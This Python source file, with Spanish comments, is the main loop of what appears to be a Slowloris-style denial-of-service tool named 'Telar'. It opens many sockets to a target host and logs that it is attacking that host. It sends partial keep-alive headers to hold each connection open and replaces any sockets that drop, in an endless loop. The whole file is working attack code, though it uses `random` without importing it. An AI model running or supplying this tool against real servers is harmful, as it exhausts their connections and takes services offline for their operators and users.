# telar/logica.py
import logging
import time
import socket
from configuracion import args
from red import iniciar_socket

lista_sockets = []

def iteracion_telar():
    logging.info("Enviando encabezados keep-alive...")
    logging.info("Cantidad de sockets: %s", len(lista_sockets))

    for s in list(lista_sockets):
        try:
            s.enviar_encabezado("X-a", str(random.randint(1, 5000)))
        except socket.error:
            lista_sockets.remove(s)

    faltan = args.sockets - len(lista_sockets)
    if faltan <= 0:
        return

    logging.info("Creando %s nuevos sockets...", faltan)
    for _ in range(faltan):
        try:
            s = iniciar_socket(args.host)
            lista_sockets.append(s)
        except socket.error as e:
            logging.debug("Fallo al crear nuevo socket: %s", e)
            break

def ejecutar_telar():
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.DEBUG if args.verbose else logging.INFO,
    )

    ip = args.host
    logging.info("Atacando %s con %s sockets.", ip, args.sockets)

    logging.info("Creando sockets iniciales...")
    for _ in range(args.sockets):
        try:
            s = iniciar_socket(ip)
            lista_sockets.append(s)
        except socket.error as e:
            logging.debug("Error al crear socket inicial: %s", e)
            break

    while True:
        try:
            iteracion_telar()
        except (KeyboardInterrupt, SystemExit):
            logging.info("Deteniendo Telar")
            break
        except Exception as e:
            logging.debug("Error en iteración Telar: %s", e)
        time.sleep(args.tiempo_espera)
